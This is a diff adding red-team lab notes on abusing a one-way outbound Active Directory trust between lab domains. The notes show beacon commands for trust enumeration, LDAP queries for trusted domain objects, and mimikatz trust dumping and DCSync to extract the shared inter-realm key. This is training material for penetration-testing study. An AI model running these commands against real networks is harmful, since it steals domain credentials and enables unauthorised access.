@@ -102,4 +102,40 @@ To hop a domain trust using Kerberos, get an inter-realm key.
 
 ## One-Way Outbound
 
-Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A; but users in Domain A should not be able to access resources in Domain B.  If we're in Domain A, then it's by design that we should not be able to access Domain B.  An outbound trust exists between cyberbotic.io and msp.org.  The direction of trust is such that cyberbotic.io trusts msp.org (so users of msp.org can access resources in cyberbotic.io).
+If (domain) A trusts B, users in B can access resources in A; but users in A should not be able to access resources in B.In lab, an outbound trust exists between cyberbotic.io and msp.org. The direction of trust is such that cyberbotic.io trusts msp.org (so users of msp.org can access resources in cyberbotic.io).
+
+DEV has a trust with CYBER, so we can query the trusts that it has by adding the -Domain parameter:
+
+    beacon> getuid
+    [*] You are DEV\bfarmer
+    beacon> powershell Get-DomainTrust -Domain cyberbotic.io
+    SourceName      : cyberbotic.io
+    TargetName      : msp.org
+    TrustDirection  : Outbound
+
+Can still partially exploit this trust and obtain "domain user" access from CYBER to MSP with the shared credential for the trust. Both domains in a trust relationship store a shared password (auto-changed every 30 days) in a Trusted Domain Object (TDO). TDOs are stored in the system container and can be read via LDAP.  Here the DC in CYBER has two TDOs for its trusts with DEV and MSP:
+
+    beacon> execute-assembly ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
+
+    [*] TOTAL NUMBER OF SEARCH RESULTS: 2...
+
+Can move laterally to the DC itself and dump from memory (BUT involves memory patching, which is very risky on a DC):
+
+    beacon> run hostname
+    dc-1
+    beacon> getuid
+    [*] You are NT AUTHORITY\SYSTEM (admin)
+    beacon> mimikatz lsadump::trust /patch
+
+OR use DCSync with the TDO's GUID:
+
+    beacon> powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
+    beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
+    ... [ Out ] MSP.ORG -> CYBERBOTIC.IO...    /// new PW
+    ... [Out-1] MSP.ORG -> CYBERBOTIC.IO...    /// old PW
+
+In most cases, the current [Out] key is the one to get. There is also a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain (e.g. if we get all the user accounts in the DEV domain, we'll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts).
+
+    beacon> execute-assembly ADSearch.exe --search "(objectCategory=user)"
+    [*] TOTAL NUMBER OF SEARCH RESULTS: 11...
+
